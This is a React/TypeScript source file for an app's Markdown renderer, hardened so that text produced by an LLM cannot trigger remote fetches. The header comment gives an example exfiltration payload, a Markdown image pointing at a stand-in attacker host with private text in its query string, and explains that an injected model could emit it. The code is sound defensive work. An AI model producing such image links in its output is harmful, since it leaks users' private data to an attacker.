import ReactMarkdown, { type Components, type UrlTransform } from "react-markdown";
import remarkGfm from "remark-gfm";

// The only Markdown renderer in the app (design 01 §H4). Everything it renders may come from an LLM that read
// someone else's text, so it must never make the browser fetch a remote URL by itself: a Markdown image like
// ![](https://attacker/?d=<private text>) would leak data the moment it renders. The CSP blocks that too (H3);
// this is the first line of defence.

const SCHEME = /^([a-z][a-z0-9+.-]*):/i;
const SAFE_LINK_SCHEMES = new Set(["http", "https", "mailto"]);
const SAFE_DATA_IMAGE = /^data:image\/(png|jpeg|gif|webp);base64,[a-z0-9+/=\s]+$/i;

export function isRelativeUrl(url: string): boolean {
  return !SCHEME.test(url) && !url.startsWith("//") && !url.startsWith("\\\\");
}

export function isSafeImageSrc(src: string): boolean {
  // "#" and "" are what safeUrl() leaves behind after blocking a URL.
  if (src === "" || src.startsWith("#")) return false;
  return isRelativeUrl(src) || SAFE_DATA_IMAGE.test(src);
}

export const safeUrl: UrlTransform = (url, key) => {
  const value = url.trim();
  if (key === "src" && SAFE_DATA_IMAGE.test(value)) return value;
  if (isRelativeUrl(value)) return value;
  const scheme = SCHEME.exec(value)?.[1].toLowerCase();
  return scheme && SAFE_LINK_SCHEMES.has(scheme) ? value : "#";
};

function hostOf(url: string): string | null {
  try {
    return new URL(url).host || null;
  } catch {
    return null;
  }
}

const components: Components = {
  img({ src, alt }) {
    const url = typeof src === "string" ? src : "";
    if (url && isSafeImageSrc(url)) return <img src={url} alt={alt ?? ""} loading="lazy" />;
    const host = hostOf(url);
    // Remote image: show a link the user can choose to open, never an <img> the browser loads automatically.
    return (
      <a href={url && url !== "#" ? url : "#"} target="_blank" rel="noopener noreferrer nofollow" className="md-remote-image">
        [image: {alt || "untitled"}]{host && <span className="md-host"> {host}</span>}
      </a>
    );
  },
  a({ href, children }) {
    const url = href ?? "#";
    if (isRelativeUrl(url) || url === "#") return <a href={url}>{children}</a>;
    const host = url.startsWith("mailto:") ? null : hostOf(url);
    return (
      <a href={url} target="_blank" rel="noopener noreferrer nofollow">
        {children}
        {host && <span className="md-host"> ({host})</span>}
      </a>
    );
  },
};

export function Markdown({ children }: { children: string }) {
  // No raw-HTML plugin is ever added here, so model output can't inject markup.
  return (
    <div className="md">
      <ReactMarkdown remarkPlugins={[remarkGfm]} urlTransform={safeUrl} components={components}>
        {children}
      </ReactMarkdown>
    </div>
  );
}
